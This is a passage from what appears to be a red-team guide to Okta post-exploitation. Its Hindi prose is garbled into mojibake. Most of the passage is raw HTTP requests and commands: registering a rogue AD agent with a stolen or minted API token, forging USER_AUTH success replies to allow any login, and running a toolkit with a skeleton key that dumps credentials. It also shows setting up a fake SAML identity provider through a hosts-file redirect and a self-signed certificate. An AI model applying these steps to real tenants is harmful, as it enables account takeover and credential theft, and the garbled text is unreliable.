рдЕрдиреБрд░реЛрдз рдЬрд╛рд░реА рдХрд░рдХреЗ рдХрд░рддреЗ рд╣реИрдВ:
```xml
POST /api/1/internal/app/activedirectory/0oa7c027u2tcjxoki697/agent/a537ca54okqfsuu0s697/actionResult?responseid=12345 HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00JFtjd...WgkeI1Eg5Y
Content-Type: application/xml; charset=utf-8
Content-Length: 1362

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" actionId="rpc::app.active_directory.agent.reply.ok14-majorecs04a.auw2-ok14.internal//1694301421033//ZPz86MzEBzhpMhSFWzyK5wAAA_Q:440a7d52-704b-4c1b-ac79-afdc241e3080:">
<type>USER_AUTH</type>
<status>SUCCESS</status>
<message></message>
<errorCode></errorCode>
<timestamps>
<actionRecieivedFromOkta>1694358076</actionRecieivedFromOkta>
<actionSentToLdapServer>1694358076</actionSentToLdapServer>
<responseReceivedFromLdapServer>1694358076</responseReceivedFromLdapServer>
<responseSentToOkta>1694358076</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>20230910150116.726Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>20230910150116.741Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>20230910150116.741Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910150116.741Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{{"ExecutionTime":"12","AgentUpTime":"0 day(s) 22:41:49","DC":"DC01.lab.local","DomainControllerFunctionality":"WIN2016","DomainFunctionality":"WIN2016","ForestFunctionality":"WIN2016","LdapResponseTime":"0"}}</additionalInfo>
</agentActionResult>
```
рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХреЛ рдЬрд╛рд░реА рдХрд░рдиреЗ рдХрд╛ рдкрд░рд┐рдгрд╛рдо рд╣реИ рдХрд┐ Okta рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рддреА рд╣реИред

### рдПрдбреА рдХреЛ рдПрдбрдорд┐рди рдХреЗ рд░реВрдк рдореЗрдВ рд╣рд╛рдЗрдЬреИрдХ рдХрд░рдирд╛

(рд╣рдо рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рд╣рдо рдПрдХ рдЪреЛрд░реА рдХрд┐рдП рдЧрдП рдПрдЬреЗрдВрдЯ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ Okta AD рдПрдЬреЗрдВрдЯ рдХреЛ рд╣рд╛рдЗрдЬреИрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдпрджрд┐ рд╣рдордиреЗ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХреГрдд Okta рдЦрд╛рддрд╛ рдХреЛ рд╕рдВрдХреНрд░рдорд┐рдд рдХрд░ рд▓рд┐рдпрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдореМрдЬреВрджрд╛ рдПрдЬреЗрдВрдЯ рдЯреЛрдХрди рдХреЗ рдмрд┐рдирд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдХреНрдпрд╛ рд╣реЛрдЧрд╛? рдЖрдЗрдП рджреЗрдЦреЗрдВ рдХрд┐ рдЗрд╕реЗ рдХреИрд╕реЗ рдХрд░реЗрдВред

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдореЗрдВ рдПрдХ Okta AD рдПрдЬреЗрдВрдЯ API рдЯреЛрдХрди рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдлреНрд▓реЛ рдХреЛ рдкреНрд░рд╛рд░рдВрдн рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рдПрдХ OAuth рдХреЛрдб рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдерд╛рди рдкрд░ рдЬрд╛рддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```
https://example.okta.com/oauth2/authorize?redirect_uri=%2Foauth-response&response_type=code&client_id=cappT0Hfy97F1BoO1UTR&prompt=select_account
```
{% endcode %}

рдЗрд╕рд╕реЗ рдЖрдкрдХреЛ рдПрдХ рдЕрдиреБрдорддрд┐ рдкреНрд░реЙрдореНрдкреНрдЯ рдорд┐рд▓реЗрдЧрд╛ рдЬрд┐рд╕реЗ рдЖрдкрдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

рдкреНрд░рд╕реНрддреБрдд рдкреНрд░реЙрдореНрдкреНрдЯ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рд╕реЗ рдЖрдкрдХреЛ `/oauth-response` рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдорд┐рд▓реЗрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ `code` рдкреИрд░рд╛рдореАрдЯрд░ рд╣реЛрдЧрд╛:

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

рд╣рдореЗрдВ рдЗрд╕ `code` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рд▓реЗрдХрд░ POST рдЕрдиреБрд░реЛрдз рдХрд░рдХреЗ рдПрдХ API рдЯреЛрдХрди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА:
```
POST /oauth2/token HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Content-Type: application/x-www-form-urlencoded
Host: example.okta.com
Content-Length: 65
Expect: 100-continue
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

grant_type=api_token&code=7vzn01sl&client_id=cappT0Hfy97F1BoO1UTR
```
рдпрд╣ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣рдореЗрдВ рд╣рдорд╛рд░реЗ рдПрдкреАрдЖрдИ рдЯреЛрдХрди рд▓реМрдЯрд╛рддреА рд╣реИ:
```
{"api_token":"00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd"}
```
рдЗрд╕ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣рдореЗрдВ рдЗрд╕реЗ рдПрдХ рд╕рдХреНрд░рд┐рдп AD рдбреЛрдореЗрди рд╕реЗ рдЬреЛрдбрд╝рдирд╛ рд╣реЛрдЧрд╛ред рд╣рдо рдЗрд╕реЗ API рдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд░рддреЗ рд╣реИрдВ:
```
POST /api/1/internal/app/activedirectory/ HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Host: example.okta.com
Accept: application/xml; charset=UTF-8
Content-Type: application/xml; charset=UTF-8
Content-Length: 86
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<domain name="lab.local" />
```
рдпрд╣ рд╣рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд XML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрдЧрд╛, рдЬрд╣рд╛рдВ рд╣рдореЗрдВ рдмрд╛рдж рдореЗрдВ `id` рдЧреБрдгрдзрд░реНрдо рдорд╛рди рдХреЛ рд╕рдВрднрд╛рд▓рдирд╛ рд╣реЛрдЧрд╛ред
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<activeDirectory id="0oa4jsza16ar1UdaW696">
<name>lab.local</name>
<newInstance>false</newInstance>
</activeDirectory>
```
рдЕрдЧрд▓реЗ, рд╣рдо рдЕрдкрдиреЗ рдХрдиреЗрдХреНрдЯрд░ рдХреЛ рдирд╛рдо рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ HTTP API рдХреЙрд▓ рдХрд░рддреЗ рд╣реИрдВ:
```
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent?name=DC02 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 0
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd
```
рдпрд╣рд╛рдБ рд╣рдореЗрдВ рдПрдХ XML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╡рд╛рдкрд╕ рдорд┐рд▓реЗрдЧреА рдЬрд╣рд╛рдВ рд╣рдореЗрдВ рдлрд┐рд░ рд╕реЗ `id` рдЧреБрдгрдзрд░реНрдо рдХреЛ рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА:

{% code overflow="wrap" %}
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><agent id="a532camqiqXMhlOf5697"><name>DC02</name></agent>
```
{% endcode %}

рдЕрдВрдд рдореЗрдВ, рд╣рдо рд╕рдВрдЪрд╛рд▓рди рдХреЛ рдкреНрд░рд╛рд░рдВрдн рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ:
```xml
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent/a532camqiqXMhlOf5697/actionResult?agentVersion=3.13.0.0 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 825
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<type>INIT</type>
<status>SUCCESS</status>
<timestamps>
<actionRecieivedFromOkta />
<actionSentToLdapServer />
<responseReceivedFromLdapServer />
<responseSentToOkta>1694304008</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>00010101000000.000Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>00010101000000.000Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>00010101000000.000Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910000008.174Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{}</additionalInfo>
</agentActionResult>
```
рдЗрд╕рдХреЗ рдмрд╛рдж, рд╣рдорд╛рд░рд╛ рдирдХрд▓реА AD рдПрдЬреЗрдВрдЯ рддреИрдпрд╛рд░ рд╣реИ, рдФрд░ рдкрд╣рд▓реЗ рджрд┐рдЦрд╛рдП рдЧрдП рддрд░реАрдХреЗ рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдпрд╛рд╕реЛрдВ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░реЗрдЧрд╛ред

рдЕрдм рд╕реНрдкрд╖реНрдЯ рд╣реИ рдХрд┐ рд╣рдо рдмрд░реНрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ рдХрд░рдирд╛ рдирд╣реАрдВ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдХреБрдЫ рдЙрдкрдпреЛрдЧ-рдорд╛рдорд▓реЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЯреВрд▓ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ [рдпрд╣рд╛рдВ](https://github.com/xpn/OktaPostExToolkit) рд╕реЗ рдЙрдкрд▓рдмреНрдз рд╣реИред

рд╣рдо рдЗрд╕ рдЯреВрд▓ рдХреЛ `рдЯреЛрдХрди` рдореЛрдб рдореЗрдВ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдХрд┐рд╕реА рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рдПрдЬреЗрдВрдЯ рдЯреЛрдХрди рдорд╛рди рдХреЛ рд▓реЗ рд▓реЗрдЧрд╛ рдФрд░ Okta API рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрдЧрд╛, рдФрд░ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдХреЛрдИ рднреА рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдбрдВрдк рдХрд░реЗрдЧрд╛:

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 token --api-token 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd --app-id 0oa7c027u2TcJxoki697 --agent-id a537cnm9ldwPILkqP697
```
{% endcode %}

рд╡реАрдбрд┐рдпреЛ рдЙрджрд╛рд╣рд░рдг:

* [https://www.youtube.com/watch?v=ZYRcfj6jtaA](https://www.youtube.com/watch?v=ZYRcfj6jtaA)
* [https://youtu.be/Sob2u6xEjTE](https://youtu.be/Sob2u6xEjTE)

рдпрд╣ рдЙрдкрдХрд░рдг рдПрдХ рдирдП рдПрдбреА рдХрдиреЗрдХреНрдЯрд░ рдХреЛ рднреА рдкрдВрдЬреАрдХреГрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдпрджрд┐ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдПрдХ Okta рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЙрдкрд▓рдмреНрдз рд╣реЛрдВ: 

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 oauth --machine-name DC01 --windows-domain lab.local --code OAUTH_CODE_HERE
```
{% endcode %}

### Okta рдирдХрд▓реА SAML рдкреНрд░рджрд╛рддрд╛

(рд╣рдорд▓рд╛ [**рдпрд╣рд╛рдВ рд╕реЗ**](https://trustedsec.com/blog/okta-for-red-teamers) рдХреЙрдкреА рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ).

рдПрдХ рдФрд░ рддрдХрдиреАрдХ рдЬреЛ рдореВрд▓реНрдпрд╡рд╛рди рд╕рд╛рдмрд┐рдд рд╣реБрдИ рд╣реИ рд╡рд╣ рд╣реИ рдПрдХ рдирдХрд▓реА SAML рдкреНрд░рджрд╛рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ред

рд╣рд╛рд▓ рд╣реА рдореЗрдВ Okta рдиреЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХрддрд╛ рдореЗрдВ рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рд╣рдорд▓реЛрдВ рдкрд░ [рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЕрдкрдбреЗрдЯ](https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection) рдкреНрд░рджрд╛рди рдХреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЬрд╛рдирдирд╛ рдЙрдкрдпреЛрдЧреА рд╣реИ рдЬрдм рдПрдХ рдкрд░реНрдпрд╛рд╡рд░рдг рдкрд░ рдЧрддрд┐рд╡рд┐рдзрд┐ рдХрд╛ рдирдХрд▓реАрдХрд░рдг рдХрд░ рд░рд╣реЗ рд╣реЛ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрди рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЗ рд▓рд┐рдП рдЬреЛ рдЗрд╕ рд╡рд┐рд╢реЗрд╖ рд╣рдорд▓реЗ рдХреЗ рдбрд┐рдЯреЗрдХреНрд╢рди рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рдирд╛ рдЪрд╛рд╣реЗрдВред

рдпрджрд┐ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдПрдХ рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп Okta рдЦрд╛рддрд╛ рд╣реИ, рддреЛ рд╣рдо Okta рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЗ рд╣рд┐рд╕реНрд╕реЗ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдмрд╛рд╣рд░реА рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛ рддреИрдирд╛рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рд╕реЗ рдмрд╛рд╣рд░реА рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХреЛ рдЬреИрд╕реЗ Entra ID рдЗрдВрдЯреАрдЧреНрд░реЗрдЯреЗрдб рдРрдкреНрд╕ рдХрд╛ рдЪрдпрди рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред

рд▓реЗрдХрд┐рди рдпрджрд┐ рд╣рдо IDP рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдХреНрдпрд╛ рд╣реЛрдЧрд╛? рдпрд╣ рддреЛ рд╕реНрд╡рд╛рднрд╛рд╡рд┐рдХ рд╣реИ рдХрд┐ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣рдо рдХрд┐рд╕реА рднреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЕрдиреБрд░реЛрдз рдХреЛ рд╕реНрд╡реАрдХреГрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд╣рдо рдЪрд╛рд╣рддреЗ рд╣реИрдВред

рдЗрд╕реЗ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рдПрдХ рдХрд╕реНрдЯрдо рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛ рдХреЛ рддреИрдирд╛рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рд╣рдорд╛рд░реА рджреБрд╖реНрдЯ рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ рдмрд╣реБрдд рд╣реА рдЬрдВрдХреА SAML IDP [рдпрд╣рд╛рдВ](https://github.com/xpn/OktaPostExToolkit) рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдЙрдкрдХрд░рдг рдХреЗ рдкреАрдЫреЗ рдХреА рдореБрдЦреНрдп рд╡рд┐рдЪрд╛рд░ рд╣реИ рдХрд┐ рд╣рдореЗрдВ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рд╕рдВрдмрдВрдзрд┐рдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рд╕рд╛рдЗрди рдХрд┐рдП рдЧрдП SAML рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдВ рдЬрд╛рд░реА рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдПред

рдпрд╣ рд╕рд░реНрд╡рд░ `/saml` рдкрд░ рдЖрдиреЗ рд╡рд╛рд▓реЗ HTTP рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реБрдиреЗрдЧрд╛, рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ рдкрд╣рд▓реЗ Okta рдореЗрдВ рдПрдХ IDP рддреИрдирд╛рдд рдХрд░рдиреА рд╣реЛрдЧреАред

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдо SAML 2.0 IDP рдХрд╛ рдЪрдпрди рдХрд░рддреЗ рд╣реИрдВ:

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

IDP рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддреЗ рд╕рдордп, рд╣рдореЗрдВ рдХреБрдЫ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдкрд░ рдзреНрдпрд╛рди рджреЗрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдкрд╣рд▓рд╛ рд╣реИ `рдирд╛рдо`, рдЬреЛ Okta рдХреЗ рдХрд┐рд╕реА рдЕрдиреНрдп рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ рджрд┐рдЦрд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдирд╛рдо рд╣реИред

рдЕрдЧрд▓рд╛ рд╣реИ рдЬрд╛рд░рдХ URL, рдЬрд┐рд╕реЗ URI рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдПрдХ рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рдХреЗ рдорд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрд╣ рдлрд┐рд░ рднреА рдХреБрдЫ рднреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рд╣рдо `https://www.example.com/` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗред

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

рд╣рдореЗрдВ рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ `IdP Single Sign-On URL` рдлрд╝реАрд▓реНрдб рдХреЛ рднреА рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЬрд╣рд╛рдВ рд╣рдорд╛рд░рд╛ SAML рд╕рд░реНрд╡рд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИред рдЕрдм, рдпрд╣ рдмрд╛рдд рдмрд╣реБрдд рд░реЛрдЪрдХ рд╣реИ рдХрд┐ рдпрд╣ URL рд╣рдорд╛рд░реЗ рд╕рд░реНрд╡рд░ рдХреА рдУрд░ рдкрд╣реБрдВрдЪрдиреЗ рд╡рд╛рд▓рд╛ URL рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдореБрдЭреЗ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдЗрд╕реЗ рдмрддрд╛рдирд╛ рд▓рд╛рдпрдХ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╣рдо рдЗрд╕ рдлрд╝реАрд▓реНрдб рдореЗрдВ рджрд░реНрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП URL рдореЗрдВ рдХрд╛рдлреА рд░рдЪрдирд╛рддреНрдордХ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдмреНрд▓реВ рдЯреАрдо рдХрд╛ рдХрд╛рдо рдереЛрдбрд╝рд╛ рдореБрд╢реНрдХрд┐рд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рд╣рдо рдЗрд╕ рдлрд╝реАрд▓реНрдб рдХреЛ `https://idp.google.com/saml` рдХреЗ рд░реВрдк рдореЗрдВ рдХреБрдЫ рднреА рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рд╣рдореЗрдВ рдХрд░рдиреЗ рдХреА рдПрдХрдорд╛рддреНрд░ рдЪреАрдЬ рд╣реИ рдЗрдирдмрд╛рдЙрдВрдб SAML рдЕрдиреБрд░реЛрдз рдХреЛ рдкрдХрдбрд╝рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред рдпрд╣рд╛рдВ рд░реЛрдЪрдХ рдмрд╛рдд рд╣реИ: SAML рдЕрдиреБрд░реЛрдз рдХреЛ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдкрд░ рдлрд╝реЙрд░рд╡рд░реНрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ Okta SAML `AuthRequest` рдЙрддреНрдкрдиреНрди рдХрд░реЗрдЧрд╛ рдФрд░ рд╣рдорд╛рд░реЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ `https://idp.google.com/` рдкрд░ рдпрд╣ рд╕рд╛рде рдореЗрдВ SAML рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░реЗрдЧрд╛ред рдпрд╣ рдмреЗрд╢рдХ, рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдо рд╕реНрдерд╛рдиреАрдп рд╣реЛрд╕реНрдЯ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ `idp.google.com` рдХреЛ `127.0.0.1` рдкрд░ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
echo '127.0.0.1 idp.google.com' | sudo tee -a /etc/hosts
```
рд╣рдореЗрдВ рдПрдХ рд╕рд╛рдЗрдирд┐рдВрдЧ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рднреА рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕реЗ рд╣рдо рдирд┐рдпрдВрддреНрд░рдг рдХрд░рддреЗ рд╣реИрдВред рдпрд╣ рд╕реНрд╡-рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ OpenSSL рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

{% code overflow="wrap" %}
```bash
openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes -keyout example.com.key -out example.com.crt
```
{% endcode %}

рдлрд┐рд░ рд╕реЗ, рдЖрдк рдЗрд╕рдореЗрдВ рд░рдЪрдирд╛рддреНрдордХ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рдкреНрд░рд╛рдорд╛рдгрд┐рдХрддрд╛ рдХреЗ рдЖрд╕рдкрд╛рд╕ рдХреЛрдИ рд╡рд┐рд╢реЗрд╖ рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рдирд╣реАрдВ рд╣реИрдВред

рдХреА рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдо рдмрд╕ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ Okta рдкрд░ рдЕрдкрд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЕрдкрдирд╛ IDP рдмрдирд╛рддреЗ рд╣реИрдВред

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

